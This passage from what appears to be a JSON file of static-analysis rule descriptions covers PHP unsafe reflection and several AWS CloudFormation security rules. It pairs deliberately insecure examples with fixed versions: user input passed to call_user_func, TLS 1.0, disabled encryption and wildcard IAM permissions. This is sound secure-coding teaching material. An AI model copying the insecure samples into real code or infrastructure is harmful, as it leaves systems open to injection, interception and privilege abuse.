attacker additionally manages to\nelevate their privileges as an administrator and attack other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nthrough a combination of unsafe deserialization and misconfiguration:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>In the following example, the code simulates a feature in an image editing application that allows users to install plugins to add new filters or\neffects. It assumes the user will give a known name, such as \"SepiaEffect\".</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfunction apply($effectName)\n{\n    try {\n        $result = call_user_func($effectName, \"applyFilter\");\n    } catch (\\Throwable $e) {\n        return \"Filter Failure\";\n    }\n\n    if ( $result == TRUE) {\n        return \"Filter Success\";\n    }\n    else {\n        return \"Filter Failure\";\n    }\n}\n\napply($_GET[\"filter\"]);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$EFFECT_ALLOW_LIST = [\n    \"SepiaEffect\",\n    \"BlackAndWhiteEffect\",\n    \"WaterColorEffect\",\n    \"OilPaintingEffect\"\n];\n\nfunction apply($effectName)\n{\n    global $EFFECT_ALLOW_LIST;\n    if (!in_array($effectName, $EFFECT_ALLOW_LIST)) {\n        return \"Filter Failure\";\n    }\n\n    try {\n        $result = call_user_func($effectName, \"applyFilter\");\n    } catch (\\Throwable $e) {\n        return \"Filter Failure\";\n    }\n\n    if ( $result == TRUE) {\n        return \"Filter Success\";\n    }\n    else {\n        return \"Filter Failure\";\n    }\n}\n\napply($_GET[\"filter\"]);\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved commands</h4>\n<p>The cleanest way to avoid this defect is to validate the input before using it in a reflection method.</p>\n<p>Create a list of authorized and secure classes that you want the application to be able to execute.<br> If a user input does not match an entry in\nthis list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/470\">CWE-470 - Use of Externally-Controlled Input to Select Classes or Code ('Unsafe\n  Reflection')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cloudformation:S6327": {
        "name": "Using unencrypted SNS topics is security-sensitive",
        "htmlDesc": "<p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)\ncommunication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages\nwhen they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to\naccess the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The topic contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-sns-topic.html\">AWS::SNS::Topic</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  Topic:  # Sensitive, encryption disabled by default\n    Type: AWS::SNS::Topic\n    Properties:\n      DisplayName: \"unencrypted_topic\"\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-sns-topic.html\">AWS::SNS::Topic</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  Topic:\n    Type: AWS::SNS::Topic\n    Properties:\n      DisplayName: \"encrypted_topic\"\n      KmsMasterKeyId:\n        Fn::GetAtt:\n          - TestKey\n          - KeyId\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html\">AWS Documentation</a> - Encryption at rest </li>\n  <li> <a href=\"https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/\">Encrypting messages published to\n  Amazon SNS with AWS KMS</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cloudformation:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in API Gateway</h2>\n<h3>Code examples</h3>\n<p>These code samples illustrate how to fix this issue in both APIGateway and ApiGatewayV2.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  CustomApi:\n    Type: AWS::ApiGateway::DomainName\n    Properties:\n      SecurityPolicy: \"TLS_1_0\"  # Noncompliant\n</pre>\n<p>The ApiGatewayV2 uses a weak TLS version by default:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  CustomApi: # Noncompliant\n    Type: AWS::ApiGatewayV2::DomainName\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  CustomApi:\n    Type: AWS::ApiGateway::DomainName\n    Properties:\n      SecurityPolicy: \"TLS_1_2\"\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  CustomApi:\n    Type: AWS::ApiGatewayV2::DomainName\n    Properties:\n      DomainNameConfigurations:\n        - SecurityPolicy: \"TLS_1_2\"\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cloudformation:S6249": {
        "name": "Authorizing HTTP communications with S3 buckets is security-sensitive",
        "htmlDesc": "<p>By default, S3 buckets can be accessed through HTTP and HTTPs protocols.</p>\n<p>As HTTP is a clear-text protocol, it lacks the encryption of transported data, as well as the capability to build an authenticated connection. It\nmeans that a malicious actor who is able to intercept traffic from the network can read, modify or corrupt the transported content.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive information. </li>\n  <li> The infrastructure has to comply with AWS Foundational Security Best Practices standard. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to deny all HTTP requests:</p>\n<ul>\n  <li> for all objects (<code>*</code>) of the bucket </li>\n  <li> for all principals (<code>*</code>) </li>\n  <li> for all actions (<code>*</code>) </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>No secure policy is attached to this S3 bucket:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3Bucket:\n    Type: 'AWS::S3::Bucket' # Sensitive\n</pre>\n<p>A policy is defined but forces only HTTPs communication for some users:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3Bucket:\n    Type: 'AWS::S3::Bucket' # Sensitive\n    Properties:\n      BucketName: \"mynoncompliantbucket\"\n\n  S3BucketPolicy:\n    Type: 'AWS::S3::BucketPolicy'\n    Properties:\n      Bucket: !Ref S3Bucket\n      PolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Deny\n            Principal:\n              AWS: # Sensitive: only one principal is forced to use https\n                - 'arn:aws:iam::123456789123:root'\n            Action: \"*\"\n            Resource: arn:aws:s3:::mynoncompliantbuckets6249/*\n            Condition:\n              Bool:\n                \"aws:SecureTransport\": false\n</pre>\n<h2>Compliant Solution</h2>\n<p>A secure policy that denies the use of all HTTP requests:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3Bucket:\n    Type: 'AWS::S3::Bucket' # Compliant\n    Properties:\n      BucketName: \"mycompliantbucket\"\n\n  S3BucketPolicy:\n    Type: 'AWS::S3::BucketPolicy'\n    Properties:\n      Bucket: \"mycompliantbucket\"\n      PolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Deny\n            Principal:\n              AWS: \"*\" # all principals should use https\n            Action: \"*\" # for any actions\n            Resource: arn:aws:s3:::mycompliantbucket/* # for any resources\n            Condition:\n              Bool:\n                \"aws:SecureTransport\": false\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html#transit\">AWS documentation</a> - Enforce encryption\n  of data in transit </li>\n  <li> <a href=\"https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html#fsbp-s3-5\">AWS Foundational Security\n  Best Practices controls</a> - S3 buckets should require requests to use Secure Socket Layer </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cloudformation:S6304": {
        "name": "Policies granting access to all resources of an account are security-sensitive",
        "htmlDesc": "<p>A policy that allows identities to access all resources in an AWS account may violate <a\nhref=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a>. Suppose an identity has permission to access\nall resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive\ninformation will occur.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The AWS account has more than one resource with different levels of sensitivity.</p>\n<p>A risk exists if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is\nto organize or <a\nhref=\"https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/\">tag</a>\nresources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>\n<h2>Sensitive Code Example</h2>\n<p>Update permission is granted for all policies using the wildcard (*) in the <code>Resource</code> property:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  ExamplePolicy:\n    Type: AWS::IAM::ManagedPolicy\n    Properties:\n        PolicyDocument:\n            Version: \"2012-10-17\"\n            Statement:\n                - Effect: Allow\n                  Action:\n                    - \"iam:CreatePolicyVersion\"\n                  Resource:\n                    - \"*\" # Sensitive\n        Roles:\n            - !Ref MyRole\n</pre>\n<h2>Compliant Solution</h2>\n<p>Restrict update permission to the appropriate subset of policies:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  ExamplePolicy:\n    Type: AWS::IAM::ManagedPolicy\n    Properties:\n        PolicyDocument:\n            Version: \"2012-10-17\"\n            Statement:\n                - Effect: Allow\n                  Action:\n                    - \"iam:CreatePolicyVersion\"\n                  Resource:\n                    - !Sub \"arn:aws:iam::${AWS::AccountId}:policy/team1/*\"\n        Roles:\n            - !Ref MyRole\n</pre>\n<h2>Exceptions</h2>\n<ul>\n  <li> Should not be raised on key policies (when AWS KMS actions are used.) </li>\n  <li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "cloudformation:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://aws.amazon.com/kinesis/\">AWS Kinesis</a> Data Streams, server-side encryption is disabled by default:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  KinesisStream: # Sensitive\n    Type: AWS::Kinesis::Stream\n    Properties:\n      ShardCount: 1\n      # No StreamEncryption\n</pre>\n<p>For <a href=\"https://aws.amazon.com/elasticache/\">Amazon ElastiCache</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  Example:\n    Type: AWS::ElastiCache::ReplicationGroup\n    Properties:\n      ReplicationGroupId: \"example\"\n      TransitEncryptionEnabled: false  # Sensitive\n</pre>\n<p>For <a href=\"https://aws.amazon.com/ecs/\">Amazon ECS</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  EcsTask:\n    Type: AWS::ECS::TaskDefinition\n    Properties:\n      Family: \"service\"\n      Volumes:\n        -\n          Name: \"storage\"\n          EFSVolumeConfiguration:\n            FilesystemId: !Ref FS\n            TransitEncryption: \"DISABLED\"  # Sensitive\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Load Balancer Listeners</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  HTTPlistener:\n   Type: \"AWS::ElasticLoadBalancingV2::Listener\"\n   Properties:\n     DefaultActions:\n       - Type: \"redirect\"\n         RedirectConfig:\n           Protocol: \"HTTP\"\n     Protocol: \"HTTP\" # Sensitive\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/opensearch-service/index.html\">Amazon OpenSearch domains</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  Example:\n    Type: AWS::OpenSearchService::Domain\n    Properties:\n      DomainName: example\n      DomainEndpointOptions:\n        EnforceHTTPS: false # Sensitive\n      NodeToNodeEncryptionOptions:\n        Enabled: false # Sensitive\n</pre>\n<p>For <a href=\"https://aws.amazon.com/msk/\">Amazon MSK</a> communications between clients and brokers:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  MSKCluster:\n    Type: 'AWS::MSK::Cluster'\n    Properties:\n      ClusterName: MSKCluster\n      EncryptionInfo:\n        EncryptionInTransit:\n          ClientBroker: TLS_PLAINTEXT # Sensitive\n          InCluster: false # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://aws.amazon.com/kinesis/\">AWS Kinesis</a> Data Streams server-side encryption:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  KinesisStream:\n    Type: AWS::Kinesis::Stream\n    Properties:\n      ShardCount: 1\n      StreamEncryption:\n         EncryptionType: KMS\n</pre>\n<p>For <a href=\"https://aws.amazon.com/elasticache/\">Amazon ElastiCache</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  Example:\n    Type: AWS::ElastiCache::ReplicationGroup\n    Properties:\n      ReplicationGroupId: \"example\"\n      TransitEncryptionEnabled: true\n</pre>\n<p>For <a href=\"https://aws.amazon.com/ecs/\">Amazon ECS</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  EcsTask:\n    Type: AWS::ECS::TaskDefinition\n    Properties:\n      Family: \"service\"\n      Volumes:\n        -\n          Name: \"storage\"\n          EFSVolumeConfiguration:\n            FilesystemId: !Ref FS\n            TransitEncryption: \"ENABLED\"\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Load Balancer Listeners</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  HTTPlistener:\n   Type: \"AWS::ElasticLoadBalancingV2::Listener\"\n   Properties:\n     DefaultActions:\n       - Type: \"redirect\"\n         RedirectConfig:\n           Protocol: \"HTTPS\"\n     Protocol: \"HTTP\"\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/opensearch-service/index.html\">Amazon OpenSearch domains</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  Example:\n    Type: AWS::OpenSearchService::Domain\n    Properties:\n      DomainName: example\n      DomainEndpointOptions:\n        EnforceHTTPS: true\n      NodeToNodeEncryptionOptions:\n        Enabled: true\n</pre>\n<p>For <a href=\"https://aws.amazon.com/msk/\">Amazon MSK</a> communications between clients and brokers, data in transit is encrypted by default,\nallowing you to omit writing the <code>EncryptionInTransit</code> configuration. However, if you need to configure it explicitly, this configuration\nis compliant:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  MSKCluster:\n    Type: 'AWS::MSK::Cluster'\n    Properties:\n      ClusterName: MSKCluster\n      EncryptionInfo:\n        EncryptionInTransit:\n          ClientBroker: TLS\n          InCluster: true\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Documentation</a> - Listeners\n  for your Application Load Balancers </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">AWS\n  Documentation</a> - Stream Encryption </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cloudformation:S6245": {
        "name": "Disabling server-side encryption of S3 buckets is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is\nread from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if\nthey were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure\nitself.</p>\n<p>There are three SSE options:</p>\n<ul>\n  <li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)\n    <ul>\n      <li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li>\n    </ul>  </li>\n  <li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)\n    <ul>\n      <li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li>\n    </ul>  </li>\n  <li> Server-Side Encryption with Customer-Provided Keys (SSE-C)\n    <ul>\n      <li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s\n      encryption keys. </li>\n    </ul>  </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive information. </li>\n  <li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>\n<h2>Sensitive Code Example</h2>\n<p>Server-side encryption is not used:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3Bucket:\n    Type: 'AWS::S3::Bucket' # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Server-side encryption with Amazon S3-Managed Keys is used:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3Bucket:\n    Type: 'AWS::S3::Bucket' # Compliant\n    Properties:\n      BucketEncryption:\n        ServerSideEncryptionConfiguration:\n          - ServerSideEncryptionByDefault:\n              SSEAlgorithm: AES256\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html\">AWS documentation</a> - Protecting data using\n  server-side encryption </li>\n</ul>",
        "severity": "MINOR"
      },
      "cloudformation:S6302": {
        "name": "Policies granting all privileges are security-sensitive",
        "htmlDesc": "<p>A policy that grants all permissions may indicate an improper access control, which violates <a\nhref=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a>. Suppose an identity is granted full\npermissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources\nmay occur and therefore result in loss of information.</p>\n<h2>Ask Yourself Whether</h2>\n<p>Identities obtaining all the permissions:</p>\n<ul>\n  <li> only require a subset of these permissions to perform the intended function. </li>\n  <li> have monitored activity showing that only a subset of these permissions is actually used. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start\nwith the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in\nproduction, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>\n<h2>Sensitive Code Example</h2>\n<p>A customer-managed policy that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  ExamplePolicy:\n    Type: AWS::IAM::ManagedPolicy\n    Properties:\n        PolicyDocument:\n            Version: \"2012-10-17\"\n            Statement:\n                - Effect: Allow\n                  Action:\n                    - \"*\" # Sensitive\n                  Resource:\n                    - !Ref MyResource\n        Roles:\n            - !Ref MyRole\n</pre>\n<h2>Compliant Solution</h2>\n<p>A customer-managed policy that grants only the required permissions:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  ExamplePolicy:\n    Type: AWS::IAM::ManagedPolicy\n    Properties:\n        PolicyDocument:\n            Version: \"2012-10-17\"\n            Statement:\n                - Effect: Allow\n                  Action:\n                    - \"s3:GetObject\"\n                  Resource:\n                    - !Ref MyResource\n        Roles:\n            - !Ref MyRole\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> <a href=\"https://cloud.google.com/iam/docs/understanding-roles\">Google Cloud Documentation</a> - Understanding roles 